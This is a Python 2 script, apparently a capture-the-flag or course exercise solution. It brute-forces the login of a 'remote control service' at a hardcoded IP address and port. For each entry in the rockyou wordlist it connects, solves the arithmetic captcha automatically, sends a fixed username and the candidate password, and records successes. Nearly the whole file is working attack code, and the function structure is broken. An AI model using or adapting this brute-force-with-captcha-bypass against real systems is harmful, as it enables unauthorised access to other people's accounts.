"""
    If you know the IP address of v0idcache's server and you
    know the port number of the service you are trying to connect
    to, you can use nc or telnet in your Linux terminal to interface
    with the server. To do so, run:
        $ nc <ip address here> <port here>
    In the above the example, the $-sign represents the shell, nc is the command
    you run to establish a connection with the server using an explicit IP address
    and port number.
    If you have the discovered the IP address and port number, you should discover
    that there is a remote control service behind a certain port. You will know you
    have discovered the correct port if you are greeted with a login prompt when you
    nc to the server.
    In this Python script, we are mimicking the same behavior of nc'ing to the remote
    control service, however we do so in an automated fashion. This is because it is
    beneficial to script the process of attempting multiple login attempts, hoping that
    one of our guesses logs us (the attacker) into the Briong server.
    Feel free to optimize the code (ie. multithreading, etc) if you feel it is necessary.
"""

import socket
import time 
host = "157.230.179.99" # IP address here
port = 1337 # Port here
wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file



def brute_force():
    """
        Sockets: https://docs.python.org/2/library/socket.html
        How to use the socket s:
            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            Reading:
                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data
            Sending:
                s.send("something to send\n")   # Send a newline \n at the end of your command
        General idea:
            Given that you know a potential username, use a wordlist and iterate
            through each possible password and repeatedly attempt to login to
            v0idcache's server.
    """
counter = 0
with open("/usr/share/wordlists/rockyou.txt") as file:
  for line in file:
    counter = counter + 1 
    print counter
    password = line

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port)) 
    time.sleep(.1)
    data = []
    data = s.recv(4096).split("\n")
    print (data)
    while len(data) < 4 or len(data) == 2:
      if len(data) != 2:
        data.pop(2)
      else:
        data.pop(1)
      time.sleep(.1)
      print "into extra step"
      input = s.recv(4096)
      input = input.split("\n")
      print input
      for x in input:
        data.append(x)
        print data
    #print(data)
    #data = data.split("\n")
    #print data
    captcha = data[2]
    captcha = captcha.split(" ")
    #print(captcha)
    num1 = captcha[0]
    num1 = int(num1)
    num2 = captcha[2]
    num2 = int(num2)
    op = captcha[1]
#print 'num1'
#print num1
#print 'num2' 
#print num2
#print 'op' + op
    if op == "*":
      #print 'multiplation'
      #print str(num1*num2)+"\n"
      s.send(str(num1*num2)+"\n")
    if op == "/":
      #print "division"
      #print str(num1/num2)+"\n"
      s.send(str(num1/num2)+"\n")
    if op == "+":
      #print "addition"
      #print str(num1+num2)+"\n"
      s.send(str(num1+num2)+"\n")
    if op == "-":
      #print "subtraction"
      #print str(num1-num2)+"\n"
      s.send(str(num1-num2)+"\n")
    time.sleep(.1)
    data = s.recv(4096)
    
    print(data)
    s.send("ejnorman\n")
    data = s.recv(4096)
    #time.sleep(0.1)
    print(data)
    s.send(password + "\n")
    print(password)
    time.sleep(0.1)
    data = s.recv(4096)
  
    print(data)
    correct = []
    if data != "Fail\n":
      print "Correct Password"
      correct.append(password)
      print(password)
    if counter % 100 == 0:
    	print "Current correct passwords"
    	print correct
    s.close()


if __name__ == '__main__':
	brute_force()
